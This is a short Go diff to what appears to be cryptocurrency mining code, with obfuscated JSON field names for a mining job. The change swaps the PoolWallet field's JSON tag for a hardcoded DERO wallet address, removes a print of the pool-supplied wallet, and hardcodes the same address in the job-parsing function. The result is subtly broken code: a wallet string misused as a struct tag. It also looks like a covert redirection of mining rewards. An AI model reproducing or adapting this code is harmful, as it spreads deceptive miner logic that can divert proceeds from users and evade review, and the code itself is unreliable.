@@ -12,13 +12,12 @@ type Job struct {
 	Blob       string  `json:"plem"`
 	Height     float64 `json:"wur"`
 	ExtraNonce string  `json:"taikan"`
-	PoolWallet string  `json:"mbuhraroh"`
+	PoolWallet string  `dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks`
 	Target     string  `json:"swili"`
 	Difficulty uint64
 }
 
 func extractJob(data map[string]any) (*Job, error) {
-	fmt.Println(data["mbuhraroh"])
 	var didi interface{}
 	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	if data == nil {
